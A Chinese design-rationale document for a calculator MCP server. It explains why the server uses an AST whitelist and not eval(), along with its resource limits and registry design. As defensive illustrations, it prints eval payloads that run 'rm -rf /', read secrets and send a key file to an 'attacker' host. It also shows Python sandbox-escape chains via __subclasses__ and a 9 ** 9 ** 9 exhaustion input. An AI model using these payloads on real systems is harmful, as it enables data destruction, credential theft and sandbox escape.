# 设计取舍记录

记录几个"当时为什么这么选"的决定。将来有人想改这些设计时，先看看当初的约束是否还成立。

---

## 1. 为什么不用 `eval()`

**问题**：计算器要执行模型给出的字符串。

**诱惑**：`eval(expression)` 一行搞定，支持所有 Python 语法，看起来能力最强。

**为什么不**：`eval` 执行的是**任意 Python 代码**，不只是数学。同一行代码可以变成：

```python
eval("__import__('os').system('rm -rf /')")
eval("open('/path/to/secrets').read()")
eval("__import__('urllib.request').urlopen('http://attacker/?' + str(open('key').read()))")
```

而输入字符串来自大模型——模型可能被提示注入操纵，也可能自己"发明"出看起来像数学
但其实是代码的东西。一个数学工具拿到执行任意代码的能力，是把整个工具的信任边界
炸掉。而且这条路没有中间地带：一旦用了 `eval`，就不可能靠"过滤关键词"补救
（`getattr` / `__import__` / f-string / 编码绕过等手段层出不穷）。

**采用**：AST 白名单 + 隔离命名空间 + 资源限额。见 `features/calculator/safe_eval.py`。

**代价**：支持的语法比 `eval` 少（不能定义函数、不能循环、不能导入）。
但计算器的目标用户是"要算一个数"的模型，这个代价换来的确定性收益远大于损失。

---

## 2. 为什么是"AST 白名单"而不是"正则黑名单"

**黑名单思路**：禁用 `import`、`__`、`open`、`eval`、`exec` 这些危险词。

**为什么不行**：
- 绕过方式无穷：`__import__` 可以用 `ge''tattr` 拼出来；`open` 可以通过
  `().__class__.__bases__[0].__subclasses__()` 找到；Unicode 归一化、注释插入、
  字符串拼接都能骗过正则。
- 黑名单需要**穷举所有危险**，而白名单只需要**穷举所有安全**——后者的集合小得多、可控得多。

**采用**：白名单 + 默认拒绝。`_Evaluator.generic_visit` 对任何未显式实现的节点抛错。
所以新 Python 语法出现时，默认是"拒绝"而不是"意外放行"。
这个默认值是安全设计里最重要的一个选择。

---

## 3. 为什么属性访问 (`a.b`) 被禁止

看起来最人畜无害的语法，其实是最经典的沙箱逃逸入口：

```python
().__class__.__bases__[0].__subclasses__()   # 拿到所有已加载的类，进而找到 file/os 等
"".__class__.__mro__[1].__subclasses__()
```

Python 的对象图是连通的——只要能访问属性，就能从任意对象走到 `object`，
再枚举出全部子类，最终找到能读写文件的那个。所以**属性访问必须整类禁掉**，
而不是只禁 `__` 开头的（`().__class__` 里 `class` 本身不带下划线前缀的名也可能被利用）。

`visit_Call` 里还额外要求"函数必须是一个裸名字"（`ast.Name`），
这就同时堵住了 `a.b()` 和 `a[b]()` 两种调用形式。

## 4. 为什么给幂运算单独加限额

```python
9 ** 9 ** 9
```

这个表达式只有 9 个字符，但结果是大约 10^369693099 这个量级的整数——
计算它的位数比宇宙中的原子还多，足以让进程内存耗尽、CPU 打满。
类似的还有 `10 ** 7!`（阶乘版）。

**采用**：指数绝对值上限 1000（`_checked_pow`），且 `**` 运算符与 `pow()` 函数
**共用同一道检查**。共用这一点很关键——只堵一条路是常见的疏漏：
开发者加了函数限额，忘了运算符，攻击者用另一种写法照样得手。

同类限制还有：表达式长度、整数位数、阶乘输入上限。全部在 `safe_eval.py` 顶部集中定义，
方便统一调整。

## 5. 为什么错误不直接抛异常，而是返回 `{ok: false, ...}`

MCP 层面抛异常会变成协议错误，模型看到的往往是一坨带堆栈的技术信息，
它既读不懂，也拿不到"我该怎么改"的线索。

**采用**：`ToolInputError` 在 `server.py` 的 wrapper 里被转成结构化返回值：

```json
{
  "ok": false,
  "error_type": "invalid_input",
  "message": "未知单位 'furlong'。支持 length / mass / volume / time / data / temperature 六类，例如 km、lb、gal、min、gb、c。",
  "hint": "请根据 message 修正参数后重试。"
}
```

配套的写法约束：**错误消息里列出所有合法取值**。这样模型一次报错就能改正，
省掉"试探 → 再报错"的多轮往返。对模型来说，这本质上是一种"用错误信息做 few-shot 提示"。

## 6. 为什么在 FastMCP 之上再加一层 registry

FastMCP 已经能注册工具了，为什么还要自己维护一份清单？

| 能力 | FastMCP 原生 | 加 registry 后 |
|---|---|---|
| 注册工具 | ✅ | ✅ |
| **遍历所有已注册工具** | ✗（无稳定公开接口） | ✅ |
| **按配置启停功能** | ✗ | ✅ |
| **自检 / 生成文档** | ✗ | ✅ |
| **依赖排序与环检测** | ✗ | ✅ |
| **工具名冲突在启动期报错** | 部分 | ✅ |

核心是第一条：没有"运行期的工具账本"，后面所有能力都无从谈起。
`mount_tools()` 遍历 registry 挂载，这个函数**不认识任何具体工具名**，
所以新增功能时它不需要改动——这是解耦的可验证标志。

代价是多了一层间接：工具从"装饰器直接挂在 mcp 上"变成"先登记再挂载"。
但换来的是可启停、可自省、可文档化。对一个"以后要持续加功能"的项目，这笔交易划算。

## 7. 为什么功能目录扫描只认"子包"

`loader.py` 用 `ispkg=True` 只收集子包，平级的 `.py` 文件（如 `base.py`）被跳过。

**理由**：如果连平级文件也扫，那么往 `features/` 下放任何工具函数模块
（比如公共的 `_helpers.py`）都会被当成功能模块尝试加载，一不留神就报
"没有提供任何工具"。用"目录 = 功能"这个强约定，把公共代码和功能模块在物理上分开，
扫描规则变得无歧义。

**代价**：每个功能至少要有两个文件（`__init__.py` + `feature.py`）。
对"加功能"这个动作来说，这点仪式感换来的是规则简单，值得。

## 8. 为什么浮点结果要收窄到 12 位有效数字

`0.1 + 0.2` 在 IEEE 754 双精度下等于 `0.30000000000000004`。这个值在数学上"没错"，
但对模型有害：它会把这一长串尾巴当成有效信息带进后续推理，比如据此认为
"结果不等于 0.3"，从而得出错误结论。

**采用**：`format_value()` 用 `:.12g` 格式化，同时**保留 `raw_value` 字段给需要全精度的人**。

也就是：给人（和模型）看的是干净值，需要机器精度的场景仍能拿到原值。
两个都提供，而不是二选一——这是"面向模型的接口设计"和"面向程序员的接口设计"
可以并存的例子。

---

## 9. 为什么 README 里反复强调"不要 print 到 stdout"

stdio 传输下，本进程的 **stdout 就是 JSON-RPC 协议通道**。一行 `print("debug")`
会插进协议流里，客户端 json 解析失败，连接直接断掉，而且报错信息通常很隐晦
（"Unexpected token d in JSON"之类），排查起来很费时间。

这是 MCP 服务端最高频的低级错误，所以在本项目的代码、README、EXTENDING.md
三处都写了提醒，并在 `setup_logging()` 里把日志强制导向 stderr。

---

## 10. 为什么预留了"功能"这个粒度，而不是直接堆工具

如果所有工具平铺在一个大模块里，功能变多后会出现：
- 模型面对 50 个工具，选择准确率显著下降
- 没法按场景裁剪工具集（日程任务却看到了一堆统计函数）
- 无法整体启停、无法按功能独立测试和文档化

**采用**：功能（Feature）作为一等单元，既是加载/启停/测试的单位，
也是"工具集"的自然分组。环境变量启停、依赖声明、独立测试都挂在它上面。
这也是为什么 `EXTENDING.md` 里第 9 节专门讲了"按场景装配不同工具集"
——功能粒度让这件事成为一条配置命令，而不是一次重构。
